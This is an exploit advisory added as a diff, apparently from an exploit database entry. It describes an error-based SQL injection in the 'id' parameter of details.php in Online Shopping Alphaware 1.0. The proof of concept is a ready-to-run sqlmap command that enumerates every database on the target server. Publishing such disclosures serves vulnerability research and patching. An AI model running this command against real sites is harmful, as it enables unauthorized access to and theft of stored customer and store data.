@@ -1,0 +1,11 @@
+# Title: Online Shopping Alphaware 1.0 - Error-Based SQL injection
+# Exploit Author: Moaaz Taha (0xStorm)
+# Date: 2020-08-20
+# Vendor Homepage: https://www.sourcecodester.com/php/14368/online-shopping-alphaware-phpmysql.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14368&title=Online+Shopping+Alphaware+in+PHP%2FMysql# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 3.2.4
+# Description
+This parameter "id" is vulnerable to Error-Based blind SQL injection in this path "/alphaware/details.php?id=431860" that leads to retrieve all databases.
+
+#POC
+sqlmap -u "http://192.168.1.55:8888/alphaware/details.php?id=431860" -p id --dbms=mysql --dbs --technique=E --threads=10
